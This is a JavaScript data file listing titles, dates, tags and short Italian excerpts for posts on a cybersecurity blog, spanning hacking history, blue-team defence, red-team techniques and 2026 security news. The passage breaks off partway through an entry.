// [POSTS:START]
const POSTS = [
  {
    "id": "psn-breach-lulzsec-2011",
    "title": "PlayStation Network Breach 2011: 77 milioni di account e 23 giorni offline",
    "date": "2026-06-25",
    "cat": "storia",
    "tags": [
      "PSN",
      "PlayStation",
      "Sony",
      "2011",
      "LulzSec",
      "breach",
      "Anonymous",
      "gaming"
    ],
    "excerpt": "Aprile 2011: Sony disattiva il PlayStation Network per 23 giorni dopo che 77 milioni di account sono stati compromessi. Il più grande breach ai consumatori fino a quel momento — e un caso studio su come non gestire un incidente."
  },
  {
    "id": "samy-worm-xss-myspace-2005",
    "title": "Il Samy Worm 2005: il primo worm virale della storia del web — tutto XSS",
    "date": "2026-06-24",
    "cat": "storia",
    "tags": [
      "Samy Worm",
      "XSS",
      "MySpace",
      "2005",
      "Samy Kamkar",
      "worm",
      "storia web"
    ],
    "excerpt": "20 ottobre 2005: un codice JavaScript si diffonde da profilo a profilo su MySpace. In meno di 24 ore infetta un milione di account. Il primo worm virale mai visto su una piattaforma social."
  },
  {
    "id": "target-breach-hvac-2013",
    "title": "Target Breach 2013: 40 milioni di carte di credito rubate tramite un fornitore di HVAC",
    "date": "2026-06-23",
    "cat": "storia",
    "tags": [
      "Target",
      "breach 2013",
      "supply chain",
      "HVAC",
      "POS",
      "Fazio Mechanical",
      "credenziali rubate"
    ],
    "excerpt": "Novembre 2013: 40 milioni di carte di credito rubate da Target nei giorni del Black Friday. Il vettore d'attacco: le credenziali di rete di un fornitore di impianti di climatizzazione."
  },
  {
    "id": "mafiaboyy-ddos-2000",
    "title": "MafiaBoy 2000: il quindicenne che mise in ginocchio Yahoo, Amazon ed eBay",
    "date": "2026-06-22",
    "cat": "storia",
    "tags": [
      "MafiaBoy",
      "DDoS",
      "2000",
      "Michael Calce",
      "storia hacking",
      "e-commerce"
    ],
    "excerpt": "Febbraio 2000: Yahoo è offline per ore, poi CNN, Amazon, eBay, Dell. Dietro agli attacchi c'è Michael Calce, 15 anni, noto online come MafiaBoy. Il caso che portò alla prima legislazione moderna sul cybercrime."
  },
  {
    "id": "operation-aurora-google-cina-2009",
    "title": "Operation Aurora 2009: quando la Cina hackerò Google e cambiò la cybersecurity",
    "date": "2026-06-21",
    "cat": "storia",
    "tags": [
      "Operation Aurora",
      "Google",
      "Cina",
      "APT",
      "zero-day",
      "spionaggio",
      "Internet Explorer"
    ],
    "excerpt": "Gennaio 2010: Google annuncia di essere stata vittima di un attacco sofisticato dalla Cina. Operation Aurora cambiò per sempre il modo in cui il mondo capisce la cyberguerra."
  },
  {
    "id": "osint-difensivo-monitoraggio",
    "title": "OSINT Difensivo: monitorare la propria esposizione online come fanno gli attaccanti",
    "date": "2026-06-20",
    "cat": "blue",
    "tags": [
      "OSINT",
      "difensivo",
      "brand monitoring",
      "Google Alerts",
      "Shodan",
      "Have I Been Pwned",
      "threat intelligence"
    ],
    "excerpt": "Prima di attaccarti, gli avversari raccolgono informazioni su di te da fonti pubbliche. L'OSINT difensivo consiste nell'eseguire questa ricognizione su se stessi per scoprire le esposizioni prima."
  },
  {
    "id": "backup-recovery-strategia-3-2-1",
    "title": "Backup e Recovery: la regola 3-2-1 e come costruire una strategia anti-ransomware",
    "date": "2026-06-19",
    "cat": "blue",
    "tags": [
      "backup",
      "recovery",
      "ransomware",
      "3-2-1",
      "BDR",
      "RTO",
      "RPO",
      "business continuity"
    ],
    "excerpt": "Il backup è l'ultima linea di difesa contro il ransomware. La regola 3-2-1, i backup immutabili, i test di restore e tutto ciò che serve per una strategia che funzioni davvero."
  },
  {
    "id": "soc-analyst-giornata-tipo",
    "title": "Giornata tipo di un SOC Analyst: triage, alert fatigue e investigazione",
    "date": "2026-06-18",
    "cat": "blue",
    "tags": [
      "SOC",
      "analyst",
      "triage",
      "alert fatigue",
      "SIEM",
      "incident response",
      "blue team"
    ],
    "excerpt": "Come si passa una giornata in un Security Operations Center? Dalla gestione degli alert mattutini all'investigazione di un incidente reale. Il ruolo, gli strumenti e le sfide quotidiane."
  },
  {
    "id": "network-segmentation-vlan-dmz",
    "title": "Segmentazione di rete: VLAN, DMZ e microsegmentazione per ridurre il blast radius",
    "date": "2026-06-17",
    "cat": "blue",
    "tags": [
      "VLAN",
      "DMZ",
      "segmentazione",
      "microsegmentazione",
      "firewall",
      "rete",
      "blue team"
    ],
    "excerpt": "Una rete piatta è un sogno per gli attaccanti: compromesso un host, si muovono liberamente. La segmentazione limita il blast radius contenendo le compromissioni ai singoli segmenti."
  },
  {
    "id": "honeypot-deception-technology",
    "title": "Honeypot e Deception Technology: intrappolare gli attaccanti con trappole digitali",
    "date": "2026-06-16",
    "cat": "blue",
    "tags": [
      "honeypot",
      "deception",
      "canary token",
      "honeytokens",
      "threat intelligence",
      "blue team"
    ],
    "excerpt": "Un honeypot ha una percentuale di falsi positivi dello 0%: se qualcuno ci interagisce, è un attaccante. Le moderne deception technology distribuiscono trappole ovunque nella rete."
  },
  {
    "id": "cloud-security-aws-misconfigurazioni",
    "title": "Cloud Security: le misconfigurazioni AWS più comuni e come evitarle",
    "date": "2026-06-15",
    "cat": "blue",
    "tags": [
      "AWS",
      "cloud security",
      "S3",
      "IAM",
      "misconfigurazioni",
      "CSPM",
      "sicurezza cloud"
    ],
    "excerpt": "Il 99% delle violazioni cloud è causato da errori di configurazione. Bucket S3 pubblici, IAM permissivo, istanze EC2 esposte: le misconfigurazioni più comuni e come correggerle."
  },
  {
    "id": "email-security-spf-dkim-dmarc",
    "title": "Email Security: SPF, DKIM e DMARC — come funzionano e come configurarli",
    "date": "2026-06-14",
    "cat": "blue",
    "tags": [
      "SPF",
      "DKIM",
      "DMARC",
      "email security",
      "phishing",
      "spoofing",
      "DNS"
    ],
    "excerpt": "Il 91% degli attacchi informatici inizia con una email. SPF, DKIM e DMARC sono i tre standard che proteggono il tuo dominio dall'essere usato per phishing e spoofing."
  },
  {
    "id": "forensica-digitale-introduzione",
    "title": "Forensica Digitale: principi, metodologia e strumenti per il DFIR",
    "date": "2026-06-13",
    "cat": "blue",
    "tags": [
      "forensica digitale",
      "DFIR",
      "Volatility",
      "Autopsy",
      "memory forensics",
      "incident response"
    ],
    "excerpt": "La forensica digitale è la scienza di raccogliere e analizzare prove digitali mantenendo la loro integrità. Principi fondamentali, catena di custodia, analisi della memoria e del disco."
  },
  {
    "id": "edr-endpoint-detection-response",
    "title": "EDR: cos'è, come funziona e come sceglierlo per la tua organizzazione",
    "date": "2026-06-12",
    "cat": "blue",
    "tags": [
      "EDR",
      "endpoint security",
      "CrowdStrike",
      "Microsoft Defender",
      "SentinelOne",
      "MITRE ATT&CK"
    ],
    "excerpt": "L'EDR è la risposta moderna all'antivirus tradizionale. Monitora il comportamento degli endpoint in tempo reale, correla eventi con MITRE ATT&CK e permette la risposta agli incidenti remota."
  },
  {
    "id": "zero-trust-architettura",
    "title": "Zero Trust: l'architettura di sicurezza che non si fida di nessuno",
    "date": "2026-06-11",
    "cat": "blue",
    "tags": [
      "Zero Trust",
      "architettura sicurezza",
      "identity",
      "microsegmentazione",
      "BeyondCorp"
    ],
    "excerpt": "Il modello Zero Trust ribalta il paradigma tradizionale: non esiste più una rete 'interna' sicura. Ogni accesso va verificato, ogni identità autenticata, ogni segmento isolato."
  },
  {
    "id": "google-dorking-recon-avanzato",
    "title": "Google Dorking avanzato: OSINT e reconnaissance con i motori di ricerca",
    "date": "2026-06-10",
    "cat": "red",
    "tags": [
      "Google Dork",
      "OSINT",
      "recon",
      "Shodan",
      "Censys",
      "passive reconnaissance",
      "pentest"
    ],
    "excerpt": "I motori di ricerca indicizzano molto più di quanto pensiamo. Google Dork, Shodan e Censys permettono di trovare informazioni critiche su target senza mai toccarli direttamente."
  },
  {
    "id": "antivirus-come-funziona-detection",
    "title": "Come funziona un antivirus moderno: firme, AMSI, behavioral analysis e EDR",
    "date": "2026-06-09",
    "cat": "red",
    "tags": [
      "antivirus",
      "AMSI",
      "EDR",
      "detection",
      "behavioral analysis",
      "sicurezza endpoint"
    ],
    "excerpt": "Capire come un antivirus rileva le minacce è fondamentale sia per chi difende che per chi testa la sicurezza. Firme, heuristic engine, AMSI, sandbox e behavioral monitoring."
  },
  {
    "id": "wifi-attacchi-wpa2",
    "title": "Sicurezza WiFi: attacchi WPA2 e come proteggere la rete wireless",
    "date": "2026-06-08",
    "cat": "red",
    "tags": [
      "WiFi",
      "WPA2",
      "handshake",
      "hashcat",
      "aircrack-ng",
      "PMKID",
      "wireless security"
    ],
    "excerpt": "WPA2 è lo standard wireless più diffuso. Come funziona l'autenticazione, cos'è il four-way handshake, come si cattura e come si analizza la robustezza della propria password."
  },
  {
    "id": "c2-framework-rilevamento",
    "title": "Command & Control: cos'è un C2 e come viene rilevato dai difensori",
    "date": "2026-06-07",
    "cat": "red",
    "tags": [
      "C2",
      "command and control",
      "Metasploit",
      "Cobalt Strike",
      "MITRE ATT&CK",
      "detection"
    ],
    "excerpt": "Un framework C2 è il cuore delle operazioni red team avanzate. Cos'è, come funziona la comunicazione attaccante-agente, e soprattutto come i blue team li rilevano."
  },
  {
    "id": "post-exploitation-persistence-linux",
    "title": "Post-Exploitation: tecniche di persistenza su Linux",
    "date": "2026-06-06",
    "cat": "red",
    "tags": [
      "persistence",
      "post-exploitation",
      "Linux",
      "cron",
      "systemd",
      "SUID",
      "backdoor"
    ],
    "excerpt": "Dopo aver ottenuto accesso a un sistema Linux, il passo successivo è mantenere l'accesso. Come funzionano le tecniche di persistenza, come si rilevano e come si rimuovono."
  },
  {
    "id": "buffer-overflow-basi",
    "title": "Buffer Overflow: le basi del vulnerability research su binari",
    "date": "2026-06-05",
    "cat": "red",
    "tags": [
      "buffer overflow",
      "exploit development",
      "gdb",
      "pwndbg",
      "checksec",
      "CTF"
    ],
    "excerpt": "Il buffer overflow è la vulnerabilità più classica dello sviluppo software. Come funziona lo stack, perché un overflow sovrascrive il return address e come si studia per CTF e pentest."
  },
  {
    "id": "file-inclusion-lfi-rfi",
    "title": "File Inclusion: LFI, RFI e Path Traversal — da lettura file a RCE",
    "date": "2026-06-04",
    "cat": "red",
    "tags": [
      "LFI",
      "RFI",
      "path traversal",
      "PHP",
      "RCE",
      "OWASP",
      "web"
    ],
    "excerpt": "Local File Inclusion e Remote File Inclusion sono vulnerabilità PHP che permettono di leggere file arbitrari e, in scenari favorevoli, ottenere code execution. Teoria, sfruttamento e difesa."
  },
  {
    "id": "pivoting-tunneling-reti",
    "title": "Pivoting e Tunneling: muoversi attraverso reti segmentate",
    "date": "2026-06-03",
    "cat": "red",
    "tags": [
      "pivoting",
      "tunneling",
      "chisel",
      "ligolo-ng",
      "sshuttle",
      "proxychains",
      "pentest"
    ],
    "excerpt": "Una volta dentro la rete perimetrale, l'attaccante deve muoversi verso segmenti interni non raggiungibili direttamente. Pivoting con chisel, ligolo-ng, sshuttle e proxychains."
  },
  {
    "id": "web-shells-upload-bypass",
    "title": "Web Shell e Upload Bypass: sfruttare vulnerabilità nei file upload",
    "date": "2026-06-02",
    "cat": "red",
    "tags": [
      "web shell",
      "file upload",
      "bypass",
      "PHP",
      "pentest",
      "OWASP"
    ],
    "excerpt": "Le vulnerabilità di file upload sono tra le più critiche del web: permettono di caricare codice eseguibile sul server. Come funzionano, come si sfruttano e come si difendono."
  },
  {
    "id": "active-directory-attacchi-base",
    "title": "Active Directory: Kerberoasting, AS-REP Roasting e i vettori di attacco fondamentali",
    "date": "2026-06-01",
    "cat": "red",
    "tags": [
      "Active Directory",
      "Kerberoasting",
      "AS-REP Roasting",
      "Windows",
      "pentest",
      "Impacket"
    ],
    "excerpt": "Active Directory è il cuore dell'infrastruttura Windows enterprise e il bersaglio principale di ogni red team. Kerberoasting, AS-REP Roasting, enumerazione e i vettori di attacco base."
  },
  {
    "id": "italia-sesta-ransomware-mondo-2025",
    "title": "Italia 6ª al mondo per attacchi ransomware: i dati del Y-Report 2026",
    "date": "2026-05-12",
    "cat": "news",
    "tags": [
      "ransomware",
      "Y-Report",
      "Yarix",
      "statistiche",
      "manifatturiero",
      "RaaS"
    ],
    "excerpt": "Lo Y-Report 2026 di Yarix certifica: l'Italia è sesta al mondo per attacchi ransomware nel 2025, con 162 casi e un raddoppio rispetto all'anno precedente. Manifatturiero e tech i più colpiti."
  },
  {
    "id": "come-funziona-internet-v2",
    "title": "Come funziona Internet — approfondimento: BGP, Anycast e la resilienza della rete",
    "date": "2026-04-10",
    "cat": "fond",
    "tags": [
      "internet",
      "BGP",
      "anycast",
      "routing",
      "infrastruttura",
      "fondamentali"
    ],
    "excerpt": "Secondo capitolo sull'infrastruttura di Internet: come il routing BGP decide il percorso dei pacchetti, cos'è Anycast e perché Internet sopravvive ai guasti."
  },
  {
    "id": "apple-coruna-webkit-exploit-ios-legacy",
    "title": "Operazione Coruna: exploit WebKit su iPhone legacy ancora supportati",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Apple",
      "WebKit",
      "iOS",
      "exploit",
      "zero-day",
      "patch"
    ],
    "excerpt": "Ricercatori scoprono un exploit WebKit attivamente sfruttato contro dispositivi iOS legacy. Apple rilascia patch d'emergenza per modelli considerati obsoleti."
  },
  {
    "id": "autenticazione-identita-digitale",
    "title": "Autenticazione e identità digitale: password, MFA, passkey e oltre",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "autenticazione",
      "MFA",
      "passkey",
      "FIDO2",
      "identità digitale",
      "password"
    ],
    "excerpt": "Come funziona l'autenticazione moderna: dai limiti delle password all'MFA, dalle passkey FIDO2 alle sfide dell'identità digitale nel 2026."
  },
  {
    "id": "blackcat-professionisti-cybersec-condannati",
    "title": "BlackCat/ALPHV: i professionisti della cybersecurity condannati per ransomware",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "BlackCat",
      "ALPHV",
      "ransomware",
      "RaaS",
      "condanna",
      "FBI"
    ],
    "excerpt": "Operatori del gruppo ransomware BlackCat/ALPHV, alcuni con background in cybersecurity legittima, ricevono condanne significative dopo operazione coordinata FBI e Europol."
  },
  {
    "id": "codewall-ai-agent-mckinsey-lilli",
    "title": "Codewall e l'agente AI Lilli di McKinsey: quando l'automazione incontra il rischio",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "AI agent",
      "McKinsey",
      "Lilli",
      "automazione",
      "AI security",
      "rischio"
    ],
    "excerpt": "L'agente AI Lilli di McKinsey e sistemi simili aprono nuovi vettori di rischio. Come gli AI agent cambiano il panorama delle minacce aziendali."
  },
  {
    "id": "come-funziona-internet",
    "title": "Come funziona Internet: dal cavo sottosmarino al tuo browser",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "internet",
      "TCP/IP",
      "DNS",
      "BGP",
      "infrastruttura",
      "fondamentali"
    ],
    "excerpt": "Quando digiti un URL succedono decine di cose in millisecondi. Dal routing BGP alla risoluzione DNS, dai protocolli TCP/IP al TLS: come funziona davvero Internet."
  },
  {
    "id": "come-funzionano-le-password",
    "title": "Come funzionano le password: hashing, salting e perché il testo in chiaro è un crimine",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "password",
      "hashing",
      "salting",
      "bcrypt",
      "PBKDF2",
      "sicurezza"
    ],
    "excerpt": "Le password non vengono memorizzate in chiaro — o non dovrebbero. Come funziona l'hashing, cos'è il salting, perché MD5 è obsoleto e cosa usare nel 2026."
  },
  {
    "id": "come-funziona-un-firewall",
    "title": "Come funziona un firewall: stateless, stateful, NGFW e WAF a confronto",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "firewall",
      "NGFW",
      "WAF",
      "stateful",
      "packet filtering",
      "sicurezza di rete"
    ],
    "excerpt": "Un firewall non è solo una lista di regole. Differenze tra stateless e stateful inspection, Next-Gen Firewall, WAF e dove collocarli nell'architettura di rete."
  },
  {
    "id": "commissione-europea-breach-ivanti",
    "title": "Breach alla Commissione Europea via Ivanti: i dettagli dell'incidente",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Commissione Europea",
      "Ivanti",
      "breach",
      "VPN",
      "exploit",
      "UE"
    ],
    "excerpt": "Sistemi della Commissione Europea compromessi tramite vulnerabilità nei gateway Ivanti. L'incidente riaccende il dibattito sulla sicurezza delle VPN istituzionali."
  },
  {
    "id": "crackarmor-linux-apparmor-vulnerabilita",
    "title": "CrackArmor: vulnerabilità nel profilo AppArmor di Linux espone sistemi enterprise",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "AppArmor",
      "Linux",
      "vulnerabilità",
      "privilege escalation",
      "kernel",
      "CVE"
    ],
    "excerpt": "Una debolezza nella configurazione dei profili AppArmor permette escape da container e privilege escalation su distribuzioni enterprise. Analisi tecnica e patch disponibili."
  },
  {
    "id": "crittografia-basi",
    "title": "Crittografia: le basi che ogni professionista della sicurezza deve conoscere",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "crittografia",
      "AES",
      "RSA",
      "chiave simmetrica",
      "asimmetrica",
      "TLS"
    ],
    "excerpt": "Simmetrica vs asimmetrica, cifrari a blocchi e a flusso, firma digitale, PKI e TLS. Le fondamenta crittografiche su cui si regge tutta la sicurezza informatica moderna."
  },
  {
    "id": "cve-2026-20127-cisco-sdwan-cvss10",
    "title": "CVE-2026-20127: vulnerabilità CVSS 10.0 in Cisco SD-WAN — massima criticità",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Cisco",
      "SD-WAN",
      "CVE",
      "CVSS",
      "RCE",
      "patch critica"
    ],
    "excerpt": "Cisco rilascia patch d'emergenza per CVE-2026-20127, vulnerabilità con score CVSS 10.0 che permette remote code execution non autenticato sui controller SD-WAN. Patch subito."
  },
  {
    "id": "cve-2026-3909-3910-chrome-zero-day",
    "title": "CVE-2026-3909/3910: zero-day in Chrome attivamente sfruttati",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Chrome",
      "Google",
      "zero-day",
      "CVE",
      "browser",
      "exploit in the wild"
    ],
    "excerpt": "Google rilascia aggiornamento d'emergenza per due zero-day in Chrome attivamente sfruttati. Le vulnerabilità interessano il motore V8 e permettono sandbox escape."
  },
  {
    "id": "dns-il-telefono-di-internet",
    "title": "DNS: il sistema di nomi che trasforma indirizzi in siti web",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "DNS",
      "resolver",
      "zone",
      "record",
      "DoH",
      "DNS security",
      "fondamentali"
    ],
    "excerpt": "Il DNS è la rubrica di Internet. Come funziona la risoluzione ricorsiva, cosa sono i record A, MX, TXT, come difendersi da DNS hijacking e cosa cambia con DNS over HTTPS."
  },
  {
    "id": "fortigate-ngfw-credenziali-servizio",
    "title": "FortiGate NGFW: credenziali di servizio esposte in migliaia di dispositivi",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "FortiGate",
      "Fortinet",
      "NGFW",
      "credenziali",
      "esposizione",
      "firewall"
    ],
    "excerpt": "Ricercatori trovano credenziali di servizio hardcoded in un sottoinsieme di FortiGate NGFW. Migliaia di dispositivi potenzialmente esposti prima della patch."
  },
  {
    "id": "glassworm-supply-chain-vscode",
    "title": "GlassWorm: attacco supply chain tramite estensioni VS Code malevole",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "supply chain",
      "VS Code",
      "estensioni",
      "malware",
      "sviluppatori",
      "npm"
    ],
    "excerpt": "La campagna GlassWorm distribuisce malware tramite estensioni VS Code apparentemente legittime. Oltre 50.000 sviluppatori potenzialmente compromessi prima della rimozione."
  },
  {
    "id": "illinois-minnesota-dati-governo-esposti",
    "title": "Illinois e Minnesota: dati governativi esposti per mesi su bucket S3 pubblico",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "data breach",
      "AWS S3",
      "governo USA",
      "misconfiguration",
      "cloud",
      "dati esposti"
    ],
    "excerpt": "Database contenenti dati sensibili di cittadini di Illinois e Minnesota rimasti pubblicamente accessibili su bucket S3 per mesi. Il caso della misconfiguration cloud nel settore pubblico."
  },
  {
    "id": "ingegneria-sociale",
    "title": "Ingegneria Sociale: come funziona e come difendersi",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "ingegneria sociale",
      "social engineering",
      "phishing",
      "pretexting",
      "vishing",
      "manipolazione"
    ],
    "excerpt": "L'ingegneria sociale sfrutta la psicologia, non il codice. Pretexting, phishing, vishing, baiting: come funzionano le tecniche di manipolazione e come costruire una cultura di difesa."
  },
  {
    "id": "lacoste-ransomware-lapsus",
    "title": "Lacoste colpita da ransomware: rivendicazione del gruppo Lapsus successor",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Lacoste",
      "ransomware",
      "Lapsus",
      "fashion",
      "data exfiltration",
      "brand"
    ],
    "excerpt": "Il brand francese Lacoste subisce un attacco ransomware rivendicato da un gruppo erede di Lapsus. Dati di dipendenti e fornitori potenzialmente esfiltrati."
  },
  {
    "id": "lexisnexis-breach-aws-lexis1234",
    "title": "LexisNexis breach: database legali esposti con credenziale 'lexis1234'",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "LexisNexis",
      "breach",
      "database",
      "credenziali deboli",
      "legal",
      "AWS"
    ],
    "excerpt": "Un database LexisNexis contenente milioni di record legali era accessibile con la password 'lexis1234'. Il caso emblematico delle credenziali di default mai cambiate."
  },
  {
    "id": "match-group-dating-apps-breach",
    "title": "Match Group: breach su Tinder, OkCupid e Hinge espone dati di milioni di utenti",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Match Group",
      "Tinder",
      "OkCupid",
      "Hinge",
      "breach",
      "dati personali",
      "dating"
    ],
    "excerpt": "Un incidente di sicurezza colpisce l'infrastruttura condivisa di Match Group. Dati di profilo, preferenze e messaggi privati di milioni di utenti potenzialmente esposti."
  },
  {
    "id": "modello-cia",
    "title": "Il modello CIA: Confidentiality, Integrity, Availability — le fondamenta della sicurezza",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "CIA triad",
      "confidenzialità",
      "integrità",
      "disponibilità",
      "fondamentali",
      "sicurezza"
    ],
    "excerpt": "Confidenzialità, Integrità, Disponibilità: la triade CIA è il framework concettuale su cui si basa tutta la sicurezza informatica. Spiegata con esempi reali."
  },
  {
    "id": "modello-osi",
    "title": "Il modello OSI: i 7 livelli della rete spiegati con attacchi reali",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "modello OSI",
      "rete",
      "layer",
      "TCP/IP",
      "protocolli",
      "fondamentali"
    ],
    "excerpt": "Il modello OSI divide la comunicazione di rete in 7 livelli. Spiegato non con teoria pura, ma con gli attacchi informatici che operano a ciascun livello."
  },
  {
    "id": "panera-bread-shinyhunters-breach",
    "title": "Panera Bread e ShinyHunters: dati di 28 milioni di clienti in vendita sul dark web",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Panera Bread",
      "ShinyHunters",
      "breach",
      "dark web",
      "dati clienti",
      "food"
    ],
    "excerpt": "Il gruppo ShinyHunters rivendica l'esfiltrazione di dati di 28 milioni di clienti Panera Bread. Email, indirizzi, ultime 4 cifre carte: già in vendita su forum underground."
  },
  {
    "id": "pki-certificati-digitali",
    "title": "PKI e certificati digitali: come funziona la fiducia su Internet",
    "date": "2026-03-15",
    "cat": "fond",
    "tags": [
      "PKI",
      "certificati",
      "CA",
      "TLS",
      "X.509",
      "firma digitale",
      "HTTPS"
    ],
    "excerpt": "Perché il lucchetto HTTPS non è garanzia assoluta. Come funziona la Public Key Infrastructure, il ruolo delle Certificate Authority e cosa succede quando la fiducia si rompe."
  },
  {
    "id": "rust-crates-malicious-cicd-env",
    "title": "Crates.io compromessa: pacchetti Rust malevoli esfiltravano variabili CI/CD",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Rust",
      "crates.io",
      "supply chain",
      "CI/CD",
      "variabili d'ambiente",
      "secrets"
    ],
    "excerpt": "Decine di crate Rust malevoli pubblicati su crates.io esfiltravano variabili d'ambiente dai pipeline CI/CD, inclusi token e credenziali cloud. Rimossi dopo segnalazione."
  },
  {
    "id": "storm-2561-seo-poisoning-vpn",
    "title": "STORM-2561: campagna di SEO poisoning distribuisce falsi client VPN",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "SEO poisoning",
      "VPN",
      "malware",
      "STORM-2561",
      "download malevolo",
      "infostealer"
    ],
    "excerpt": "Il gruppo STORM-2561 avvelena i risultati di ricerca per parole chiave VPN popolari. I siti posizionati distribuiscono client VPN trojanizzati con infostealer integrato."
  },
  {
    "id": "stryker-handala-wiper-intune",
    "title": "Stryker Medical colpita da wiper via Microsoft Intune: Handala Group",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "Stryker",
      "Handala",
      "wiper",
      "Intune",
      "Microsoft",
      "medical",
      "APT"
    ],
    "excerpt": "Il gruppo Handala sfrutta Microsoft Intune per distribuire un wiper nei sistemi di Stryker Medical. L'attacco evidenzia i rischi del mobile device management compromesso."
  },
  {
    "id": "trump-cyber-strategy-offensive-privati",
    "title": "La strategia cyber USA: Trump apre alle offensive del settore privato",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "USA",
      "cyber strategy",
      "Trump",
      "offensiva",
      "settore privato",
      "geopolitica"
    ],
    "excerpt": "La nuova direttiva cybersecurity americana allenta i vincoli sulle operazioni offensive e apre alla partecipazione di soggetti privati. Le implicazioni per l'equilibrio cyber globale."
  },
  {
    "id": "unc6426-github-aws-supply-chain",
    "title": "UNC6426: attacco supply chain via GitHub Actions e credenziali AWS",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "UNC6426",
      "GitHub Actions",
      "AWS",
      "supply chain",
      "CI/CD",
      "secrets theft"
    ],
    "excerpt": "Il gruppo UNC6426 sfrutta workflow GitHub Actions mal configurati per estrarre credenziali AWS e muoversi lateralmente nell'infrastruttura cloud delle vittime."
  },
  {
    "id": "zestix-iab-credenziali-aviazione-difesa",
    "title": "Zestix: broker di accessi iniziali vende credenziali di difesa e aviazione italiana",
    "date": "2026-03-15",
    "cat": "news",
    "tags": [
      "IAB",
      "initial access broker",
      "aviazione",
      "difesa",
      "credenziali",
      "dark web",
      "Italia"
    ],
    "excerpt": "L'Initial Access Broker noto come Zestix mette all'asta credenziali di accesso a sistemi di aziende italiane del settore aviazione e difesa su forum underground."
  },
  {
    "id": "clusit-report-2026-italia",
    "title": "Rapporto Clusit 2026: l'Italia è prima in Europa per hacktivismo",
    "date": "2026-03-12",
    "cat": "news",
    "tags": [
      "Clusit",
      "report",
      "statistiche",
      "ransomware",
      "Italia",
      "hacktivismo"
    ],
    "excerpt": "507 incidenti gravi in Italia nel 2025, +42% rispetto al 2024. Il Rapporto Clusit 2026 fotografa un paese sempre più nel mirino: PA, trasporti e telecomunicazioni i settori più colpiti."
  },
  {
    "id": "morris-worm",
    "title": "Il Morris Worm del 1988: il primo grande incidente informatico di internet",
    "date": "2026-03-10",
    "cat": "storia",
    "tags": [
      "Morris Worm",
      "1988",
      "internet",
      "worm",
      "Cornell",
      "Robert Morris",
      "storia"
    ],
    "excerpt": "Il 2 novembre 1988 un worm scritto da uno studente di Cornell mise in ginocchio il 10% di internet. Non era stato pensato per fare danni — eppure cambiò tutto."
  },
  {
    "id": "kevin-mitnick",
    "title": "Kevin Mitnick: il fuggitivo digitale che ha cambiato la cybersecurity",
    "date": "2026-03-09",
    "cat": "storia",
    "tags": [
      "Kevin Mitnick",
      "social engineering",
      "phreaking",
      "FBI",
      "storia hacking"
    ],
    "excerpt": "Kevin Mitnick era il ricercato più famoso d'America — e non sapeva programmare exploit. Il suo strumento principale era il telefono. La storia del più grande ingegnere sociale della storia."
  },
  {
    "id": "stuxnet",
    "title": "Stuxnet: l'arma digitale che ha sabotato il programma nucleare iraniano",
    "date": "2026-03-08",
    "cat": "storia",
    "tags": [
      "Stuxnet",
      "Iran",
      "SCADA",
      "cyberwarfare",
      "NSA",
      "Unit 8200",
      "storia"
    ],
    "excerpt": "Nel 2010 un worm sofisticatissimo ha distrutto centrifughe iraniane facendole sembrare funzionanti. Stuxnet è la prima cyberarma nota ad aver causato danni fisici reali."
  },
  {
    "id": "anonymous-lulzsec",
    "title": "Anonymous e LulzSec: hacktivismo, chaos e la fine dell'anonimato online",
    "date": "2026-03-07",
    "cat": "storia",
    "tags": [
      "Anonymous",
      "LulzSec",
      "hacktivismo",
      "Operation Payback",
      "Sabu",
      "storia"
    ],
    "excerpt": "Dal 2008 al 2012 Anonymous e LulzSec hanno attaccato Scientology, PayPal, Sony, FBI e CIA. Come funzionavano, cosa li ha distrutti e cosa resta della loro eredità."
  },
  {
    "id": "caso-hess-cuckoo-egg",
    "title": "Il caso Cuckoo's Egg: Clifford Stoll e la prima indagine di cyber spionaggio della storia",
    "date": "2026-03-06",
    "cat": "storia",
    "tags": [
      "Cuckoo's Egg",
      "Clifford Stoll",
      "KGB",
      "spionaggio",
      "storia",
      "1986"
    ],
    "excerpt": "1986: Clifford Stoll trova uno scompenso di 75 centesimi nei log di un mainframe universitario. Finirà per smascherare una rete di spie al servizio del KGB."
  },
  {
    "id": "sony-hack-2014",
    "title": "Sony Pictures Hack 2014: quando la Corea del Nord colpì Hollywood",
    "date": "2026-03-05",
    "cat": "storia",
    "tags": [
      "Sony",
      "hack",
      "Corea del Nord",
      "APT",
      "studio",
      "storia"
    ],
    "excerpt": "Novembre 2014: gli hacker di Guardians of Peace cancellano i sistemi di Sony Pictures e pubblicano film inediti, email private e dati di 47.000 dipendenti. Dietro c'era Pyongyang."
  },
  {
    "id": "storia-ransomware",
    "title": "Storia del ransomware: dal floppy disk di Popp ai miliardi di RaaS",
    "date": "2026-03-04",
    "cat": "storia",
    "tags": [
      "ransomware",
      "storia",
      "AIDS Trojan",
      "WannaCry",
      "RaaS",
      "CryptoLocker"
    ],
